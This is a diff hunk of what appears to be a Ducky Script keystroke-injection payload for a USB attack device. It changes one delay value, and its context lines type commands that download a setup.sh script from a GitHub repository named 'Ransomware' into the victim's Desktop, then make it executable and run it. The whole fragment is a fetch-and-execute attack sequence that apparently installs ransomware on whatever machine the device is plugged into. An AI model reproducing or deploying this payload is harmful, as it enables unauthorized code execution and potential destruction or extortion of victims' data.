@@ -15,7 +15,7 @@ GUI
 DELAY 700
 STRING cd ~/Desktop && wget https://raw.githubusercontent.com/Google-design/Ransomware/main/scripts/setup.sh
 ENTER
-DELAY 500
+DELAY 700
 REM STRING chmod +x setup.sh && ./setup.sh ; exit
 STRING chmod +x setup.sh && ./setup.sh
 ENTER
